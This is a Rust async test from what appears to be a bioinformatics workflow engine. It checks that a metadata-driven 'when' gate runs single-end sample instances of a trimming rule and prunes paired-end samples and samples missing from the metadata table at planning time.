#[tokio::test]
async fn meta_when_gate_runs_se_and_skips_pe_instances() {
    // methylseq-style endedness gate driven by the sample metadata table
    // (issue #227 item 2): `single_end_mode = false` and a per-sample
    // `endedness` column — SE instances execute, PE instances skip, and a
    // sample with NO metadata row also skips (its placeholder rendered
    // empty, so the `== 'SE'` predicate evaluated false).
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("raw")).unwrap();
    for sample in ["SE1", "PE1", "X1"] {
        std::fs::write(
            dir.path().join(format!("raw/{sample}_R1.fastq.gz")),
            "reads",
        )
        .unwrap();
    }
    std::fs::write(
        dir.path().join("samples.tsv"),
        "sample\tendedness\nSE1\tSE\nPE1\tPE\n",
    )
    .unwrap();
    let workflow_path = dir.path().join("methyl.oxoflow");
    std::fs::write(
        &workflow_path,
        r#"
        [workflow]
        name = "methyl"
        metadata_file = "samples.tsv"

        [config]
        single_end_mode = false

        [[sample_groups]]
        name = "control"
        samples = ["SE1", "PE1", "X1"]

        [[rules]]
        name = "trim"
        input = ["raw/{sample}_R1.fastq.gz"]
        output = ["trimmed/{sample}.fq"]
        when = "config.single_end_mode || {meta.endedness} == 'SE'"
        shell = "cp {input[0]} {output[0]}"
        "#,
    )
    .unwrap();

    let mut config = crate::config::WorkflowConfig::from_file(&workflow_path).unwrap();
    config.expand_wildcards().unwrap();
    let executor = LocalExecutor::new(ExecutorConfig {
        workdir: dir.path().to_path_buf(),
        ..Default::default()
    });
    let mut typed_config = HashMap::new();
    typed_config.insert("single_end_mode".to_string(), toml::Value::Boolean(false));
    let wildcard_values = HashMap::new();

    let se1 = config
        .rules
        .iter()
        .find(|r| r.name == "trim_control_SE1")
        .expect("SE1 instance");
    let record = executor
        .execute_rule_with_config(se1, &wildcard_values, &typed_config)
        .await
        .unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(dir.path().join("trimmed/SE1.fq").exists());

    // PE1 and X1 are pruned at PLAN time (gate false / missing row), so
    // the expansion matches the runtime verdict exactly — the executor
    // never sees phantom instances. The kept instance's baked `when` is
    // still re-checked at execution time (SE1 ran above).
    assert!(
        config
            .rules
            .iter()
            .all(|r| r.name != "trim_control_PE1" && r.name != "trim_control_X1"),
        "gated instances must not survive planning"
    );
}
